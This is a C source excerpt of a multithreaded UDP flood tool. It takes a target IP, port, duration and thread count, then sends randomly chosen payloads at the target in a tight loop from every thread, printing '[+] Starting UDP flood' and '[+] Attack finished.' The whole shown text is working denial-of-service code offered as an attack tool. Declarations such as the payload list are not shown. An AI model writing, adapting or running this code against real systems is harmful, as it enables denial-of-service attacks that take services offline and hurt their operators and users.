void *udp_flood(void *args) {
    struct sockaddr_in server_addr;
    int sockfd;
    char **params = (char **)args;
    char *ip = params[0];
    int port = atoi(params[1]);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Disable fragmentation (DF flag)
    int optval = IP_PMTUDISC_DO;
    if (setsockopt(sockfd, IPPROTO_IP, IP_MTU_DISCOVER, &optval, sizeof(optval)) < 0) {
        perror("Failed to set DF flag");
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(ip);

    while (attack_running) {
        const char *payload = payloads[rand() % (sizeof(payloads) / sizeof(payloads[0]))];
        size_t payload_size = strlen(payload);
        sendto(sockfd, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME (seconds)> <THREADS>\n", argv[0]);
        return 1;
    }

    signal(SIGINT, handle_interrupt);

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > THREAD_LIMIT) {
        printf("Warning: Too many threads (%d). Reducing to %d.\n", threads, THREAD_LIMIT);
        threads = THREAD_LIMIT;
    }

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    char **params = malloc(2 * sizeof(char *));
    params[0] = ip;
    params[1] = argv[2];

    printf("[+] Starting UDP flood on %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, udp_flood, (void *)params);
    }

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    free(params);
    printf("[+] Attack finished.\n");
    return 0;
}
